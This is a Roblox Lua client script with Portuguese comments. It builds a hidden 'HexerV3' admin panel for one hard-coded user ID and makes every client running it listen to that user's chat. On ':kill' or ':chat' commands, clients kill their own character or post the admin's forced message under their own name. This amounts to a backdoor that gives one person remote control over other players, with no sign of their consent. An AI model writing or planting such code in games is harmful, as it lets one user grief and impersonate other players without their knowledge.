-- [[ CONFIGURAÇÕES GLOBAIS ]]
local AdminID = 2962384943 
local Player = game.Players.LocalPlayer
local UIS = game:GetService("UserInputService")
local RS = game:GetService("ReplicatedStorage")
local TS = game:GetService("TweenService")

-- [[ MOTOR DE COMANDO OBRIGATÓRIO ]]
-- Esta parte garante que todos os "clientes" obedeçam você instantaneamente
local function ExecuteForce(msg)
    local args = msg:split(" ")
    local cmd = args[1]:lower()
    local target = args[2]

    if target == "all" or (target and Player.Name:lower():find(target:lower())) then
        if cmd == ":kill" then
            if Player.Character then Player.Character:BreakJoints() end
        elseif cmd == ":chat" then
            local text = msg:match('"(.-)"')
            local sayEvent = RS:FindFirstChild("SayMessageRequest", true) or RS:FindFirstChild("DefaultChatSystemChatEvents"):FindFirstChild("SayMessageRequest")
            if sayEvent then sayEvent:FireServer(text, "All") end
        end
    end
end

-- Escuta ativa para todos os usuários
local function ConnectToAdmin(admin)
    admin.Chatted:Connect(ExecuteForce)
end

local currentAdmin = game.Players:GetPlayerByUserId(AdminID)
if currentAdmin then ConnectToAdmin(currentAdmin) end
game.Players.PlayerAdded:Connect(function(p) if p.UserId == AdminID then ConnectToAdmin(p) end end)

-- Bloqueio de interface para não-admins
if not (Player.UserId == AdminID) then return end

-- [[ INTERFACE PREMIUM (DESIGN DARK GLASS) ]]
local ScreenGui = Instance.new("ScreenGui", Player.PlayerGui)
ScreenGui.Name = "HexerV3"
ScreenGui.DisplayOrder = 2147483647
ScreenGui.IgnoreGuiInset = true
ScreenGui.Enabled = false

local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 600, 0, 400)
Main.Position = UDim2.new(0.5, -300, 0.5, -200)
Main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Main.BorderSizePixel = 0
Main.ClipsDescendants = true
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 10)
local Stroke = Instance.new("UIStroke", Main)
Stroke.Color = Color3.fromRGB(45, 45, 45)
Stroke.Thickness = 1.5

-- Sidebar
local Sidebar = Instance.new("Frame", Main)
Sidebar.Size = UDim2.new(0, 160, 1, 0)
Sidebar.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Sidebar.BorderSizePixel = 0

-- Botões de Aba (Função de Criação)
local function CreateTab(name, icon, pos)
    local btn = Instance.new("TextButton", Sidebar)
    btn.Size = UDim2.new(1, -20, 0, 40)
    btn.Position = UDim2.new(0, 10, 0, pos)
    btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    btn.Text = "  " .. name
    btn.TextColor3 = Color3.fromRGB(200, 200, 200)
    btn.Font = Enum.Font.GothamMedium
    btn.TextXAlignment = Enum.TextXAlignment.Left
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
    
    -- Efeito Hover
    btn.MouseEnter:Connect(function() TS:Create(btn, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(40, 40, 40)}):Play() end)
    btn.MouseLeave:Connect(function() TS:Create(btn, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}):Play() end)
    
    return btn
end

local btnAdmin = CreateTab("ADMIN", "", 60)
local btnUsers = CreateTab("USERS LIST", "", 110)

-- Container de Conteúdo
local Container = Instance.new("Frame", Main)
Container.Size = UDim2.new(1, -180, 1, -20)
Container.Position = UDim2.new(0, 170, 0, 10)
Container.BackgroundTransparency = 1

-- PÁGINA ADMIN
local PageAdmin = Instance.new("Frame", Container)
PageAdmin.Size = UDim2.new(1, 0, 1, 0)
PageAdmin.BackgroundTransparency = 1

local InputName = Instance.new("TextBox", PageAdmin)
InputName.Size = UDim2.new(1, 0, 0, 45)
InputName.PlaceholderText = "Target Name (ex: all)"
InputName.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
InputName.TextColor3 = Color3.new(1,1,1)
InputName.Font = Enum.Font.Gotham
Instance.new("UICorner", InputName)

local InputChat = Instance.new("TextBox", PageAdmin)
InputChat.Size = UDim2.new(1, 0, 0, 45)
InputChat.Position = UDim2.new(0, 0, 0, 55)
InputChat.PlaceholderText = "Forced Message Content"
InputChat.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
InputChat.TextColor3 = Color3.new(1,1,1)
InputChat.Font = Enum.Font.Gotham
Instance.new("UICorner", InputChat)

local function Action(name, pos, color, cmdType)
    local b = Instance.new("TextButton", PageAdmin)
    b.Size = UDim2.new(0.48, 0, 0, 50)
    b.Position = pos
    b.Text = name
    b.BackgroundColor3 = color
    b.Font = Enum.Font.GothamBold
    b.TextColor3 = Color3.new(1,1,1)
    Instance.new("UICorner", b)
    
    b.MouseButton1Click:Connect(function()
        if cmdType == "kill" then
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(":kill " .. InputName.Text, "All")
        elseif cmdType == "chat" then
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(':chat ' .. InputName.Text .. ' "' .. InputChat.Text .. '"', "All")
        end
    end)
end

Action("KILL TARGET", UDim2.new(0, 0, 0, 120), Color3.fromRGB(150, 0, 0), "kill")
Action("FORCE CHAT", UDim2.new(0.52, 0, 0, 120), Color3.fromRGB(0, 100, 200), "chat")

-- PÁGINA USERS
local PageUsers = Instance.new("ScrollingFrame", Container)
PageUsers.Size = UDim2.new(1, 0, 1, 0)
PageUsers.BackgroundTransparency = 1
PageUsers.Visible = false
local ListLayout = Instance.new("UIListLayout", PageUsers)
ListLayout.Padding = UDim.new(0, 5)

-- Alternar Abas
btnAdmin.MouseButton1Click:Connect(function() PageAdmin.Visible = true PageUsers.Visible = false end)
btnUsers.MouseButton1Click:Connect(function() 
    PageAdmin.Visible = false PageUsers.Visible = true 
    for _,v in pairs(PageUsers:GetChildren()) do if v:IsA("Frame") then v:Destroy() end end
    for _,p in pairs(game.Players:GetPlayers()) do
        local f = Instance.new("Frame", PageUsers)
        f.Size = UDim2.new(1, -10, 0, 30)
        f.BackgroundColor3 = Color3.fromRGB(30,30,30)
        Instance.new("UICorner", f)
        local t = Instance.new("TextLabel", f)
        t.Size = UDim2.new(1, -10, 1, 0)
        t.Position = UDim2.new(0, 10, 0, 0)
        t.Text = p.Name .. " (Ativo)"
        t.TextColor3 = Color3.new(1,1,1)
        t.BackgroundTransparency = 1
        t.TextXAlignment = "Left"
    end
end)

-- [[ TECLA K E MOUSE CONTROLLER ]]
UIS.InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.K then
        ScreenGui.Enabled = not ScreenGui.Enabled
        if ScreenGui.Enabled then
            UIS.MouseBehavior = Enum.MouseBehavior.Default
            TS:Create(Main, TweenInfo.new(0.5, Enum.EasingStyle.Back), {Position = UDim2.new(0.5, -300, 0.5, -200)}):Play()
        else
            UIS.MouseBehavior = Enum.MouseBehavior.LockCenter
        end
    end
end)